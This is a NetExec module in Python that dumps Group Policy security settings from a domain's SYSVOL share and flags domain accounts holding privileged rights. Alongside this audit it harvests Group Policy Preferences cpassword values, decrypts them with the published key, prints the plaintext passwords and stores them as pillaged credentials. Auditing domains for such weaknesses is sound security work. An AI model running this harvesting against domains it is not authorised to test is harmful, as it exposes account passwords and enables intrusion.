# gpo_audit.py - dump the security settings of every GPO in SYSVOL and flag anomalies.
#
# Any authenticated domain user can read SYSVOL, so this works from a low-priv session.
# The anomaly rule: Microsoft's default templates only grant sensitive rights to built-in
# principals, never to a specific domain account. So any domain SID with RID >= 1000
# sitting in a privileged slot was put there by a human and gets printed in red.
# Everything else is printed in white so you still see the full picture.
#
# Covers SecEdit sections (Privilege Rights, Registry Keys, File Security, Service
# settings, Group Membership) and GPP files (Groups.xml plus cpassword decryption).
#
#   nxc smb <targets> -u user -p pass -M gpo_audit

import re
import xml.etree.ElementTree as ET
from base64 import b64decode
from binascii import unhexlify
from io import BytesIO

from Cryptodome.Cipher import AES
from termcolor import colored

from impacket.dcerpc.v5 import transport, lsat, lsad
from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.samr import SID_NAME_USE
from impacket.ldap import ldap as ldap_impacket

from nxc.helpers.misc import CATEGORY
from nxc.parsers.ldap_results import parse_result_attributes


PRIVILEGED_GROUP_RIDS = {
    "512", "516", "518", "519", "520",          # Domain/Enterprise/Schema Admins, DCs, GPCO
    "544", "548", "549", "550", "551", "552",   # Administrators, *Operators, Replicators
}

WELL_KNOWN_GPO = {
    "{31B2F340-016D-11D2-945F-00C04FB984F9}": "Default Domain Policy",
    "{6AC1786C-016F-11D2-945F-00C04FB984F9}": "Default Domain Controllers Policy",
}

# Fallback name map (used before/around LSA so the dump reads even if RPC is blocked).
WELL_KNOWN_SIDS = {
    "S-1-0-0": "Nobody", "S-1-1-0": "Everyone", "S-1-2-0": "Local",
    "S-1-3-0": "Creator Owner", "S-1-3-1": "Creator Group", "S-1-5-7": "Anonymous",
    "S-1-5-9": "Enterprise Domain Controllers", "S-1-5-10": "Principal Self",
    "S-1-5-11": "Authenticated Users", "S-1-5-18": "Local System",
    "S-1-5-19": "NT Authority (Local Service)", "S-1-5-20": "NT Authority (Network Service)",
    "S-1-5-32-544": "Administrators", "S-1-5-32-545": "Users", "S-1-5-32-546": "Guests",
    "S-1-5-32-547": "Power Users", "S-1-5-32-548": "Account Operators",
    "S-1-5-32-549": "Server Operators", "S-1-5-32-550": "Print Operators",
    "S-1-5-32-551": "Backup Operators", "S-1-5-32-552": "Replicators",
    "S-1-5-32-554": "Pre-Windows 2000 Compatible Access", "S-1-5-32-555": "Remote Desktop Users",
    "S-1-5-32-559": "Performance Log Users", "S-1-5-32-562": "Distributed COM Users",
    "S-1-5-32-573": "Event Log Readers", "S-1-5-32-580": "Remote Management Users",
    "S-1-15-2-1": "ALL_APP_PACKAGES",
}

# SDDL 2-letter SID aliases that can appear in the account field of an ACE.
SDDL_ALIASES = {
    "BA": "Administrators", "BU": "Users", "BG": "Guests", "AU": "Authenticated Users",
    "WD": "Everyone", "SY": "Local System", "CO": "Creator Owner", "CG": "Creator Group",
    "PU": "Power Users", "AO": "Account Operators", "SO": "Server Operators",
    "PO": "Print Operators", "BO": "Backup Operators", "RE": "Replicators",
    "DA": "Domain Admins", "DU": "Domain Users", "DG": "Domain Guests",
    "DC": "Domain Computers", "DD": "Domain Controllers", "EA": "Enterprise Admins",
    "SA": "Schema Admins", "CA": "Cert Publishers", "ED": "Enterprise Domain Controllers",
    "LS": "Local Service", "NS": "Network Service", "IU": "Interactive Users",
    "NU": "Network Logon Users", "AN": "Anonymous", "RD": "Remote Desktop Users",
}

# SDDL 2-letter access-right mnemonics -> full names (display only).
RIGHTS_NAMES = {
    "GA": "GENERIC_ALL", "GR": "GENERIC_READ", "GW": "GENERIC_WRITE", "GX": "GENERIC_EXECUTE",
    "RC": "READ_CONTROL", "SD": "DELETE", "WD": "WRITE_DAC", "WO": "WRITE_OWNER",
    "KA": "KEY_ALL_ACCESS", "KR": "KEY_READ", "KW": "KEY_WRITE", "KX": "KEY_EXECUTE",
    "FA": "FILE_ALL_ACCESS", "FR": "FILE_GENERIC_READ", "FW": "FILE_GENERIC_WRITE", "FX": "FILE_GENERIC_EXECUTE",
    "CC": "CREATE_CHILD", "DC": "DELETE_CHILD", "LC": "LIST_CHILDREN", "SW": "SELF_WRITE",
    "RP": "READ_PROPERTY", "WP": "WRITE_PROPERTY", "DT": "DELETE_TREE", "LO": "LIST_OBJECT",
    "CR": "CONTROL_ACCESS", "NR": "NO_READ_UP", "NW": "NO_WRITE_UP", "NX": "NO_EXECUTE_UP",
}

_DOMAIN_SID = re.compile(r"^S-1-5-21-\d+-\d+-\d+-(\d+)$", re.IGNORECASE)
# One SDDL ACE: (type;flags;rights;objguid;inheritguid;sid[;extra]). Conditional ACEs
# (XA/XD) don't appear in secedit templates, so the simple 6-field grammar is enough.
_ACE = re.compile(r"\(([AD][^;]*);[^;]*;([^;]*);[^;]*;[^;]*;([^;)]+)")


class NXCModule:
    """Dump SYSVOL GPO security settings; anomalies (domain principal in a sensitive slot) in red."""

    name = "gpo_audit"
    description = "Dump SYSVOL GPO settings (SecEdit + GPP); anomalies granted to domain accounts shown in red"
    supported_protocols = ["smb"]
    category = CATEGORY.ENUMERATION

    def options(self, context, module_options):
        """No options available"""

    # --- the one anomaly rule, in one place ----------------------------------------

    def _domain_rid(self, sid):
        """RID (int) if sid is a domain principal with RID>=1000, else None."""
        m = _DOMAIN_SID.match(sid.strip().lstrip("*"))
        return int(m.group(1)) if (m and int(m.group(1)) >= 1000) else None

    def _hot(self, sids):
        """The domain principals (RID>=1000) among sids - the subset to paint red (non-empty == anomaly)."""
        return {s for s in sids if self._domain_rid(s)}

    def _is_privileged_group(self, token):
        token = token.strip().lstrip("*")
        if token.rsplit("-", 1)[-1] in PRIVILEGED_GROUP_RIDS:
            return True
        upper = token.upper()
        return any(k in upper for k in ("ADMIN", "BACKUP OPERATOR", "SERVER OPERATOR", "ACCOUNT OPERATOR"))

    # --- primitives ----------------------------------------------------------------

    def _read_file(self, context, connection, share, path):
        try:
            buf = BytesIO()
            connection.conn.getFile(share, path, buf.write)
            return buf.getvalue()
        except Exception as e:
            context.log.debug(f"Could not read {path}: {e}")
            return None

    def _guid_label(self, path):
        m = re.search(r"\{[0-9A-Fa-f-]{36}\}", path)
        if not m:
            return path
        guid = m.group(0).upper()
        name = WELL_KNOWN_GPO.get(guid)
        return f"{guid} ({name})" if name else guid

    def _split_ini(self, text):
        sections, current = {}, None
        for raw in text.splitlines():
            line = raw.strip().lstrip("﻿")
            if not line:
                continue
            if line.startswith("[") and line.endswith("]"):
                current = line
                sections.setdefault(current, [])
            elif current is not None:
                sections[current].append(line)
        return sections

    def _entry(self, entries, policy, section, tmpl, cells, hot):
        # cells = list of (sid, suffix) - the principals rendered into the tmpl's {P}
        # slot (suffix is "[right]" for ACL rows, "" otherwise). hot = the subset of
        # those sids to paint red, or "ALL" to paint the whole line red (rows whose
        # anomalous subject isn't a {P} principal - cpassword, GPP-add, __Memberof).
        entries.append({"policy": policy, "section": section, "tmpl": tmpl,
                        "cells": cells, "hot": hot})

    def _plain(self, sids):
        """Cells with no right-suffix, for the SID-list sections."""
        return [(s, "") for s in sids]

    @staticmethod
    def _split_list(value):
        """Split a comma-separated SID/name list, trimming the SDDL '*' prefix."""
        return [t.strip().lstrip("*") for t in value.split(",") if t.strip()]

    def _rights_name(self, rights):
        """SDDL rights field -> full names, e.g. 'KA' -> 'KEY_ALL_ACCESS'."""
        rights = rights.strip()
        if not rights:
            return "GRANT"
        if rights.startswith("0x"):                     # raw access mask - leave verbatim
            return rights
        tokens = [rights[i:i + 2] for i in range(0, len(rights), 2)]
        return "/".join(RIGHTS_NAMES.get(t, t) for t in tokens)

    def _sddl_entries(self, entries, guid, section, label, sddl):
        # One line per source rule: every allow-ACE in the SDDL becomes a trustee cell
        # `name[RIGHT]`, the right expanded to its full SDDL name. Any domain principal
        # (RID>=1000) in the DACL is reddened - a default SDDL never names one, so even a
        # read grant is anomalous (hence no write-only filtering).
        cells = []
        for ace_type, rights, sid in _ACE.findall(sddl):
            if not ace_type.startswith("A"):            # allow ACEs only
                continue
            sid = sid.strip().lstrip("*")
            cells.append((sid, f"[{self._rights_name(rights)}]"))
        if cells:
            self._entry(entries, guid, section, f"{label} = {{P}}",
                        cells, self._hot(s for s, _ in cells))

    # --- SecEdit / GptTmpl.inf -----------------------------------------------------

    def _collect_gpttmpl(self, guid, sections, entries):
        # [Privilege Rights] - one line per privilege
        for line in sections.get("[Privilege Rights]", []):
            if "=" not in line:
                continue
            priv, _, members = line.partition("=")
            row_sids = self._split_list(members)
            self._entry(entries, guid, "[Privilege Rights]",
                        f"{priv.strip()} = {{P}}", self._plain(row_sids), self._hot(row_sids))

        # Object-ACL sections (Name,Mode,SDDL rows) - one line per key/path/service
        for section, kind in (("[Registry Keys]", "registry"),
                              ("[File Security]", "file"),
                              ("[Service General Setting]", "service")):
            for line in sections.get(section, []):
                parts = line.split(",", 2)
                if len(parts) != 3:
                    continue
                target = parts[0].strip().strip('"')
                sddl = parts[2].strip().strip('"')
                self._sddl_entries(entries, guid, section, f'{kind} "{target}"', sddl)

        # [Registry Values] - mostly scalar, but some values hold an SDDL security
        # descriptor in their data (e.g. EventLog\Security\CustomSD = who may read the
        # Security log). Surface only lines whose data embeds an SDDL.
        for line in sections.get("[Registry Values]", []):
            key, sep, rest = line.partition("=")
            if not sep or "(" not in rest:            # scalar value - no embedded SDDL
                continue
            self._sddl_entries(entries, guid, "[Registry Values]", f'value "{key.strip()}"', rest)

        # [Group Membership] - one line per restricted-group entry
        for line in sections.get("[Group Membership]", []):
            if "=" not in line:
                continue
            left, _, right = line.partition("=")
            left = left.strip()
            members = self._split_list(right)
            if left.endswith("__Members"):
                group = left[: -len("__Members")].lstrip("*")
                hot = self._hot(members) if self._is_privileged_group(group) else set()
                self._entry(entries, guid, "[Group Membership]",
                            f"{group} members = {{P}}", self._plain(members), hot)
            elif left.endswith("__Memberof"):
                princ = left[: -len("__Memberof")].lstrip("*")
                anomaly = bool(self._domain_rid(princ)) and any(self._is_privileged_group(g) for g in members)
                self._entry(entries, guid, "[Group Membership]",
                            f"{princ} memberOf = {{P}}", self._plain(members), "ALL" if anomaly else set())

    # --- GPP -----------------------------------------------------------------------

    def _collect_gpp(self, context, guid, path, data, entries, creds):
        try:
            root = ET.fromstring(data)
        except ET.ParseError as e:
            context.log.debug(f"XML parse error {path}: {e}")
            return

        for el in root.iter():
            cpw = el.attrib.get("cpassword")
            if cpw:
                pw = self._decrypt_cpassword(cpw)
                user = (el.attrib.get("userName") or el.attrib.get("accountName")
                        or el.attrib.get("runAs") or el.attrib.get("username") or "")
                creds.append((user, pw))
                self._entry(entries, guid, "[GPP cpassword]", f"cpassword for '{user}': {pw}", [], "ALL")

        # Groups.xml: members ADDed to a group. Walk groups once so the group name is
        # known inline - no parent lookup, no O(members*groups) rescan.
        if path.lower().endswith("groups.xml"):
            for group in root.findall(".//Group"):
                props = group.find("./Properties")
                gname = (props.attrib.get("groupName") if props is not None else None) or group.attrib.get("name", "?")
                for member in group.findall(".//Members/Member"):
                    if member.attrib.get("action", "").upper() != "ADD":
                        continue
                    sid = member.attrib.get("sid", "")
                    if sid.startswith("S-1-"):          # route the member through {P} so it resolves + reddens
                        hot = self._hot([sid]) if self._is_privileged_group(gname) else set()
                        self._entry(entries, guid, "[GPP Groups.xml]",
                                    f"ADD {{P}} -> group '{gname}'", [(sid, "")], hot)
                    else:                                # member identified by name only - no SID to resolve/flag
                        self._entry(entries, guid, "[GPP Groups.xml]",
                                    f"ADD {member.attrib.get('name', '?')} -> group '{gname}'", [], set())

    def _decrypt_cpassword(self, cpassword):
        key = unhexlify("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
        cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
        data = b64decode(cpassword)
        iv = b"\x00" * 16
        try:
            out = AES.new(key, AES.MODE_CBC, iv).decrypt(data)
            pad = out[-1]                       # GPP uses PKCS7 padding
            if 1 <= pad <= 16:
                out = out[:-pad]
            return out.decode("utf-16-le")
        except Exception:
            return "<decrypt-failed>"

    # --- SID resolution: well-known -> LSA -> LDAP ---------------------------------

    def _resolve_sids(self, context, connection, sids):
        resolved, remaining = {}, {s for s in sids if s}
        for s in list(remaining):
            if s in WELL_KNOWN_SIDS:
                resolved[s] = WELL_KNOWN_SIDS[s]
                remaining.discard(s)
        if remaining:
            for s, name in self._lsa_lookup(context, connection, list(remaining)).items():
                resolved[s] = name
                remaining.discard(s)
        if remaining:
            resolved.update(self._ldap_lookup(context, connection, list(remaining)))
        return resolved

    def _lsa_lookup(self, context, connection, sids):
        out = {}
        try:
            rpctransport = transport.SMBTransport(connection.host, 445, r"\lsarpc", smb_connection=connection.conn)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(lsat.MSRPC_UUID_LSAT)
            policy = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)["PolicyHandle"]
        except Exception as e:
            context.log.debug(f"LSA open failed: {e}")
            return out
        try:
            resp = lsat.hLsarLookupSids(dce, policy, sids, lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
        except DCERPCException as e:
            if "STATUS_SOME_NOT_MAPPED" in str(e):
                resp = e.get_packet()
            else:
                context.log.debug(f"LSA lookup failed: {e}")
                return out
        for i, item in enumerate(resp["TranslatedNames"]["Names"]):
            if item["Use"] != SID_NAME_USE.SidTypeUnknown:
                domain = resp["ReferencedDomains"]["Domains"][item["DomainIndex"]]["Name"]
                out[sids[i]] = f"{domain}\\{item['Name']}" if domain else item["Name"]
        return out

    def _ldap_lookup(self, context, connection, sids):
        out = {}
        try:
            ldapc = ldap_impacket.LDAPConnection(url=f"ldap://{connection.host}", dstIp=connection.host)
            if getattr(connection, "kerberos", False):
                ldapc.kerberosLogin(connection.username, connection.password or "", connection.domain,
                                    connection.lmhash, connection.nthash, connection.aesKey or "",
                                    kdcHost=connection.kdcHost, useCache=bool(getattr(connection, "use_kcache", False)))
            else:
                ldapc.login(user=connection.username, password=connection.password or "",
                            domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash)
        except Exception as e:
            context.log.debug(f"LDAP fallback connect failed: {e}")
            return out
        for sid in sids:
            try:
                resp = ldapc.search(searchFilter=f"(objectSid={sid})", attributes=["sAMAccountName"])
                parsed = parse_result_attributes(resp)
                if parsed and parsed[0].get("sAMAccountName"):
                    out[sid] = f"{connection.domain}\\{parsed[0]['sAMAccountName']}"
            except Exception as e:
                context.log.debug(f"LDAP resolve {sid} failed: {e}")
        return out

    # --- output --------------------------------------------------------------------

    def _emit(self, context, tmpl, cells, hot, disp):
        # highlight() wraps its argument in bold yellow, but each segment below sets its
        # own red/white color which overrides that (last color wins). highlight is the
        # only prefix-less, file-logged emitter nxc exposes.
        red = lambda s: colored(s, "red", attrs=["bold"])
        white = lambda s: colored(s, "white")
        if hot == "ALL":
            rendered = ", ".join(disp(sid) + suf for sid, suf in cells)
            context.log.highlight(red(f"        {tmpl.replace('{P}', rendered)}"))
            return
        before, sep, after = tmpl.partition("{P}")
        if not sep:                                   # no principal list -> plain white
            context.log.highlight(white(f"        {tmpl}"))
            return
        principals = white(", ").join(
            (red if sid in hot else white)(disp(sid) + suf) for sid, suf in cells)
        context.log.highlight(white(f"        {before}") + principals + white(after))

    # --- entrypoint ----------------------------------------------------------------

    def on_login(self, context, connection):
        sysvol = None
        for share in connection.shares():
            if share["name"].lower() == "sysvol" and "READ" in share["access"]:
                sysvol = share["name"]
                break
        if not sysvol:
            context.log.fail("No readable SYSVOL share - cannot audit GPOs")
            return
        context.log.success("Found readable SYSVOL - dumping GPO settings")

        entries, creds = [], []
        for path in connection.spider(sysvol, pattern=["GptTmpl.inf", "Groups.xml", "Services.xml", "ScheduledTasks.xml"]):
            data = self._read_file(context, connection, sysvol, path)
            if not data:
                continue
            if path.lower().endswith(".inf"):
                self._collect_gpttmpl(self._guid_label(path),
                                      self._split_ini(data.decode("utf-16", errors="ignore")), entries)
            else:
                self._collect_gpp(context, self._guid_label(path), path, data, entries, creds)

        if not entries:
            context.log.display("No security settings found in any GPO")
            return

        all_sids = {sid for e in entries for sid, _ in e["cells"] if sid.startswith("S-1-")}
        sid_map = self._resolve_sids(context, connection, all_sids)

        if creds:
            try:
                host_id = context.db.get_hosts(connection.host)[0][0]
                for user, pw in creds:
                    if user:
                        context.db.add_credential("plaintext", "", user, pw, pillaged_from=host_id)
            except Exception as e:
                context.log.debug(f"Could not store GPP creds: {e}")

        def disp(s):
            if s.startswith("S-1-"):
                return sid_map.get(s, s)
            return SDDL_ALIASES.get(s, s)

        for policy in dict.fromkeys(e["policy"] for e in entries):
            context.log.display(policy)
            pol_entries = [e for e in entries if e["policy"] == policy]
            for section in dict.fromkeys(e["section"] for e in pol_entries):
                context.log.display(f"  {section}")
                for e in (x for x in pol_entries if x["section"] == section):
                    self._emit(context, e["tmpl"], e["cells"], e["hot"], disp)
